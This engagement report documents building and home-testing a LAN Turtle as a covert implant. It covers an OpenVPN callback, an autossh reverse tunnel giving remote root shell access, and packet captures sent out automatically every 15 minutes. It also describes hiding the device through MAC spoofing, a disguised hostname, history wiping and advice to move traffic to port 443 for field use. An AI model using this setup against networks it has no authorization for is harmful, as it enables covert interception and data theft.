# LAN Turtle Field Deployment — Engagement Report

**Engagement ID**: ENG-TURTLE-2026-0308
**Classification**: Internal — Lab Validation
**Date**: 2026-03-08
**Principal**: Eddie
**Operator**: Thon (Venom)
**Device**: LAN Turtle (Hak5), firmware 6.2
**Mission Type**: Defensive Validation / Research
**Status**: COMPLETE — ALL TESTS PASSED

---

## Executive Summary

The LAN Turtle was configured as a covert network implant with encrypted VPN callback to the WiFi Pineapple Mark 7, deployed and validated on Eddie's home network. All eight deployment phases completed successfully. The device captures target network traffic passively, exfiltrates loot automatically over an encrypted VPN tunnel, and maintains persistent remote access via autossh reverse SSH tunnel. Both device reboots (Turtle and Pineapple independently) were survived with full automatic service recovery and zero manual intervention. The Turtle is field-ready.

### Key Outcomes

- Full VPN tunnel operational: Turtle (10.8.0.2) ↔ Pineapple (10.8.0.1)
- Reverse SSH tunnel provides remote shell access from Eddie's PC through Pineapple
- Traffic capture on target-facing interface with automatic 15-minute exfiltration cycle
- Both devices survive independent reboots with complete service auto-recovery
- OPSEC hardening validated: MAC spoofed, innocuous hostname, key-only SSH, volatile logging

---

## 1. Mission Objectives

Eddie directed Thon to prepare the LAN Turtle as a field-ready covert implant that:

1. Calls back to the WiFi Pineapple Mark 7 over an encrypted OpenVPN tunnel
2. Captures target network traffic and exfiltrates loot to the Pineapple
3. Maintains persistent remote access via autossh reverse SSH tunnel
4. Is hardened for covert operation (MAC spoofing, hostname disguise, key-only auth)
5. Survives power cycles on both devices without manual intervention

All five objectives were met and validated.

---

## 2. Deployment Architecture

```
[Target Network Switch] ←── RJ45 (eth1, DHCP) ──── [LAN TURTLE]
  192.168.1.x                  MAC: 02:27:E6:A2:0D:36      │
                               Hostname: USB-ETH0           USB-A (eth0, power only)
                                                            │
                                                     [Router USB port]
                                                            │
                                              OpenVPN tunnel (tun0)
                                              10.8.0.2 → 10.8.0.1
                                                            │
                                              ┌─────────────▼────────────┐
                                              │   WIFI PINEAPPLE MK7     │
                                              │   OpenVPN Server         │
                                              │   tun0: 10.8.0.1        │
                                              │   wlan2: 192.168.1.76   │
                                              │   eth0: 172.16.42.1     │
                                              └─────────────┬───────────┘
                                                            │
                                              USB-C tether to Eddie's PC
                                              172.16.42.42
```

### Network Addresses (Home Test)

| Device | Interface | IP | Role |
|--------|-----------|-----|------|
| Turtle | eth1 (RJ45) | 192.168.1.77 (DHCP) | Target network tap |
| Turtle | eth0 (USB) | 172.16.84.1 (unused) | Power only in this config |
| Turtle | tun0 | 10.8.0.2 | VPN client endpoint |
| Pineapple | wlan2 | 192.168.1.76 | Home WiFi client |
| Pineapple | tun0 | 10.8.0.1 | VPN server endpoint |
| Pineapple | eth0 (USB-C) | 172.16.42.1 | Management tether to PC |
| Eddie's PC | WiFi | 192.168.1.73 | Home network |
| Eddie's PC | USB | 172.16.42.42 | Pineapple management |

### Data Flow

| Flow | Path | Protocol |
|------|------|----------|
| Callback | Turtle eth1 → home WiFi → Pineapple wlan2 | OpenVPN UDP 1194 |
| Reverse SSH | Turtle → Pineapple port 2222 → Turtle SSH | SSH over VPN (tun0) |
| Loot exfil | Turtle /tmp/captures/ → SCP → Pineapple /root/loot/turtle/ | SCP over VPN (tun0) |
| Management | Eddie PC → Pineapple 172.16.42.1 → port 2222 → Turtle | SSH chain |

---

## 3. Implementation Phases

### Phase 1: PKI Generation (WSL kali-linux)

All cryptographic material generated on WSL workstation:
- CA: 4096-bit RSA, 10-year validity
- Server cert: 2048-bit RSA (Pineapple)
- Client cert: 2048-bit RSA (Turtle)
- DH parameters: 2048-bit
- TLS-auth HMAC key
- ED25519 keypair for autossh tunnel

**Result**: COMPLETE. Keys stored in repo config dirs (private keys excluded from git).

### Phase 2: Pineapple OpenVPN Server

- Installed `openvpn-openssl` via opkg
- Server config: UDP 1194, tun device, 10.8.0.0/24 subnet, AES-128-CBC, max-clients 1
- Keys deployed to `/etc/openvpn/keys/` (chmod 600)
- Persistence: `/etc/rc.local` with 15s startup delay (UCI/init.d proved unreliable)

**Result**: COMPLETE. Server starts automatically on boot.

### Phase 3: Turtle OpenVPN Client

- Client config: `/etc/openvpn/client.conf`
- Remote: 192.168.1.76:1194 UDP (home test — update for field deployment)
- Reconnection: `connect-retry 30`, `connect-retry-max 0` (infinite retries)
- Keys deployed to `/etc/openvpn/keys/`

**Result**: COMPLETE. Client auto-connects on boot and reconnects after server outages.

### Phase 4: Autossh Reverse Tunnel

- Dedicated ED25519 keypair for tunnel authentication
- Autossh config: `-R 2222:localhost:22` to `root@10.8.0.1`
- Monitor port 20000, poll interval 30s
- Runs over VPN tunnel (tun0 interface)

**Result**: COMPLETE. Reverse tunnel survives VPN reconnections.

### Phase 5: Traffic Capture & Loot Exfiltration

- `capture.sh`: tcpdump on eth1, 5MB rotation x 4 files = 20MB max (fits 29MB tmpfs)
- Filter excludes VPN (UDP 1194) and SSH management (port 22 on 10.8.0.0/24)
- `exfil.sh`: SCP captures to Pineapple `/root/loot/turtle/YYYYMMDD/`
- Cron: `*/15 * * * *` — automatic exfil every 15 minutes

**Result**: COMPLETE. Pipeline validated end-to-end.

### Phase 6: Hardening

| Control | Implementation | Status |
|---------|---------------|--------|
| Root password | Changed from default | DONE |
| SSH auth | Key-only (password auth disabled) | DONE |
| Hostname | "USB-ETH0" (innocuous) | DONE |
| MAC spoofing | eth1 → 02:27:E6:A2:0D:36 on boot | DONE |
| Logging | /tmp only (volatile, no overlay writes) | DONE |
| Shell history | Cleared on every boot via rc.local | DONE |
| Overlay footprint | 244KB / 1.5MB (16%) — minimal | DONE |
| VPN keys (Pineapple) | chmod 600 on all key files | DONE |
| Pineapple deny lists | 12 MACs + 2 SSIDs (Eddie's home devices protected) | VERIFIED |

### Phase 7: Boot Sequence

Turtle `/etc/rc.local` execution order:
1. MAC spoof eth1 → 02:27:E6:A2:0D:36
2. Sleep 30s (wait for WAN DHCP)
3. Start OpenVPN client
4. Sleep 15s (wait for tun0)
5. Start autossh reverse tunnel
6. Start capture.sh (tcpdump)
7. Clear shell history

Pineapple `/etc/rc.local` addition:
```
(sleep 15 && openvpn --daemon --config /etc/openvpn/server.conf --status /tmp/openvpn-status.log 60) &
```

---

## 4. Test Results — Phase 8 Home Network Validation

### 4.1 Initial Deployment

| Test | Result | Evidence |
|------|--------|----------|
| Turtle DHCP on home network | PASS | eth1: 192.168.1.77 |
| MAC spoof active | PASS | 02:27:E6:A2:0D:36 (not Hak5 OUI) |
| Hostname on router | PASS | "USB-ETH0" in router device table |
| VPN tunnel established | PASS | tun0: 10.8.0.2, ping 10.8.0.1 OK |
| Autossh reverse tunnel | PASS | Port 2222 listening on Pineapple |
| SSH through reverse tunnel | PASS | Full root shell on Turtle |
| tcpdump capturing | PASS | PID active, eth1, filter applied |
| Cron exfil running | PASS | `*/15 * * * * /root/exfil.sh` |

### 4.2 Loot Exfiltration Pipeline

| Step | Result | Evidence |
|------|--------|----------|
| tcpdump capture | PASS | /tmp/captures/capture.pcap0 growing |
| Manual exfil.sh run | PASS | SCP to Pineapple over VPN |
| Loot on Pineapple | PASS | /root/loot/turtle/20260308/capture.pcap0 (293KB) |
| Pull to Eddie's PC | PASS | SCP from Pineapple to WSL |
| pcap validation | PASS | capinfos: 1,834 packets, Ethernet, valid |

**pcap SHA256**: `49b5fdc934a88fc9e6322989730e4e45cb11881e7bfceb644f388da66ea13b07`
**pcap location**: `captures/capture_pre-reboot_1834pkts_293KB.pcap` (in this engagement directory)

### 4.3 Turtle Reboot Recovery

| Service | Pre-Reboot PID | Post-Reboot PID | Auto-Recovered |
|---------|---------------|-----------------|----------------|
| OpenVPN client | 1351 | 1352 | YES |
| Autossh | 1370 | 1365 | YES |
| SSH tunnel | 1566 | 1655 → 1769 | YES |
| tcpdump | 1373 | 1368 | YES |
| Exfil cron | active | 2 runs post-reboot | YES |

**Result**: PASS. All services auto-restarted. VPN reconnected. Reverse tunnel re-established. Captures resumed. Exfil cron fired on schedule.

### 4.4 Pineapple Reboot Recovery

| Component | Result | Evidence |
|-----------|--------|----------|
| wlan2 home WiFi | Reconnected | 192.168.1.76 |
| OpenVPN server (rc.local) | Auto-started | PID 3071, UDP 1194 bound, tun0: 10.8.0.1 |
| Turtle VPN reconnect | Auto-reconnected | Client in status log, ping 10.8.0.2 OK |
| Reverse tunnel | Re-established | Port 2222 listening, SSH to Turtle confirmed |
| Exfil post-reboot | Working | Manual exfil.sh confirmed loot on Pineapple |

**Result**: PASS. Full stack recovered after Pineapple reboot with zero intervention.

### 4.5 Overall Pass Criteria

| Criterion | Met |
|-----------|-----|
| VPN auto-connects on boot | YES |
| Autossh re-establishes after disruption | YES |
| Captures resume after reboot | YES |
| Loot exfil works end-to-end | YES |
| All without manual intervention | YES |

**VERDICT: ALL PASS CRITERIA MET.**

---

## 5. Issues Encountered & Resolutions

### 5.1 Pineapple OpenVPN Server Persistence (CRITICAL)

**Issue**: OpenVPN server was initially started manually (`openvpn --daemon ...`). It was not configured through UCI/init.d for automatic startup. When the process died or the Pineapple rebooted, the VPN server did not restart.

**Root Cause**: UCI `openvpn.custom_config` with `enabled=1` and init.d didn't reliably launch the server with our `server.conf`. The OpenWrt init.d wrapper may have expected different config format or paths.

**Resolution**: Added manual start command to Pineapple `/etc/rc.local` with 15-second delay for network initialization. Disabled UCI openvpn service to avoid conflicts.

```
(sleep 15 && openvpn --daemon --config /etc/openvpn/server.conf --status /tmp/openvpn-status.log 60) &
```

**Validation**: Full Pineapple reboot cycle confirmed server auto-starts and Turtle reconnects.

### 5.2 Reverse Tunnel SSH Authentication

**Issue**: Initial SSH through reverse tunnel failed with "Permission denied (publickey)" — the Pineapple didn't have Eddie's Turtle SSH key.

**Resolution**: SCP'd `id_ed25519_turtle` to Pineapple at `/root/.ssh/id_ed25519_turtle_to_turtle`. SSH through tunnel then worked immediately.

### 5.3 Autossh Fallback to LAN Path

**Observation**: When VPN was temporarily down (during Pineapple reboot), autossh's monitor mechanism detected the tunnel failure and reconnected — but via the direct LAN path (192.168.1.77 → 192.168.1.76) rather than the VPN path (10.8.0.2 → 10.8.0.1). This is because the autossh target is `root@10.8.0.1`, which resolves over the VPN when available, but the Turtle's routing table also has a direct path to the Pineapple's wlan2 IP via the home network.

**Impact**: Functional but creates a non-VPN SSH connection visible on the target network. In field deployment, the Pineapple would not be on the same LAN, so this would only resolve over VPN. No action needed for field use.

---

## 6. OPSEC Assessment

### 6.1 Detection Surface

| Vector | Risk | Mitigation |
|--------|------|------------|
| MAC address | LOW | Spoofed to 02:27:E6:A2:0D:36 (random OUI, not Hak5) |
| Hostname | LOW | "USB-ETH0" — appears as generic USB Ethernet adapter |
| Network traffic | MEDIUM | VPN tunnel visible as UDP 1194 to Pineapple IP |
| Physical appearance | LOW | Resembles standard USB Ethernet adapter |
| Router device table | LOW | Shows innocuous hostname and non-Hak5 MAC |
| Log persistence | NONE | All logs in /tmp (volatile tmpfs), history cleared on boot |

### 6.2 Recommendations for Field Deployment

1. **Change VPN to TCP 443** — UDP 1194 is identifiable as OpenVPN. TCP 443 blends with HTTPS traffic.
2. **Update remote IP** — Change `client.conf` remote IP from home test (192.168.1.76) to field C2 address.
3. **Consider DDNS** — If Pineapple will be on a dynamic IP, set up DDNS for reliable callback.
4. **USB deployment position** — Router USB ports provide power. If plugged into a host PC, eth0 (172.16.84.1) management interface becomes accessible from the host — ensure this is accounted for.

---

## 7. Loot Summary

### Captured Artifacts

| File | Location | Size | Packets | Hash (SHA256) |
|------|----------|------|---------|---------------|
| capture_pre-reboot_1834pkts_293KB.pcap | `captures/` | 293,676 bytes | 1,834 | `49b5fdc934a88fc9e6322989730e4e45cb11881e7bfceb644f388da66ea13b07` |

**Capture details**:
- Interface: eth1 (target-facing RJ45)
- Encapsulation: Ethernet
- Filter: Excluded VPN (UDP 1194) and SSH management (port 22 on 10.8.0.0/24)
- Duration: ~10 minutes of home network traffic
- Content: Home network traffic (DHCP, DNS, ARP, general browsing)

---

## 8. Device File Manifest

### Turtle (`/`)

| Path | Purpose |
|------|---------|
| `/etc/openvpn/client.conf` | OpenVPN client configuration |
| `/etc/openvpn/keys/` | ca.crt, client.crt, client.key, ta.key |
| `/etc/config/autossh` | Reverse tunnel configuration |
| `/root/.ssh/id_ed25519_turtle_to_pineapple` | Autossh tunnel key (private) |
| `/root/.ssh/authorized_keys` | Eddie's SSH key (from WSL kali-linux) |
| `/root/capture.sh` | tcpdump capture script |
| `/root/exfil.sh` | Loot exfiltration script (SCP over VPN) |
| `/etc/rc.local` | Boot sequence (MAC spoof, VPN, autossh, capture, history clear) |
| `/etc/ssh/sshd_config` | SSH hardening (password auth disabled) |
| `/tmp/captures/` | Active pcap storage (volatile) |
| `/tmp/exfil.log` | Exfil run log (volatile) |

### Pineapple (`/`)

| Path | Purpose |
|------|---------|
| `/etc/openvpn/server.conf` | OpenVPN server configuration |
| `/etc/openvpn/keys/` | ca.crt, server.crt, server.key, dh2048.pem, ta.key |
| `/etc/rc.local` | OpenVPN server auto-start (15s delay) |
| `/root/.ssh/id_ed25519_turtle_to_turtle` | Key for SSH to Turtle through reverse tunnel |
| `/root/.ssh/authorized_keys` | Turtle's autossh public key |
| `/root/loot/turtle/` | Exfiltrated pcap storage (by date) |
| `/tmp/openvpn-status.log` | VPN server status (client list, updated every 60s) |

---

## 9. Closeout

### Lessons Learned

1. **OpenVPN on Pineapple**: UCI/init.d integration is unreliable for custom server configs. Use `/etc/rc.local` with a startup delay.
2. **Autossh resilience**: Autossh handles VPN interruptions gracefully — monitor ports detect failure and reconnect. Works as designed.
3. **Turtle tmpfs constraints**: 29MB tmpfs is adequate for rotating captures with 15-minute exfil cycles. 5MB x 4 = 20MB max leaves 9MB headroom.
4. **Management path dependency**: When USB is in a router (power only), all management must go through VPN/reverse tunnel. No fallback USB management path. Plan accordingly.
5. **SSH key distribution**: Each device-to-device SSH path needs its own key deployed in advance. Three keys total: Eddie→Turtle, Turtle→Pineapple (autossh), Pineapple→Turtle (management).

### Knowledge Updates

- Device state updated: `documentation/device-state.md`
- Project memory updated: `MEMORY.md`
- Engagement archived in: `engagements/2026-03-08_home-network-validation/`

### Disposition

- **Turtle**: Unplugged. Field-ready. Update `client.conf` remote IP before next deployment.
- **Pineapple**: Running. OpenVPN server active. Loot directory populated. Deny lists intact.
- **PKI**: Stored in WSL `/root/turtle-vpn-pki/` and repo config dirs (private keys excluded from git).

---

*Report compiled by Thon (Venom) for Eddie (Principal).*
*Engagement ENG-TURTLE-2026-0308 — CLOSED.*
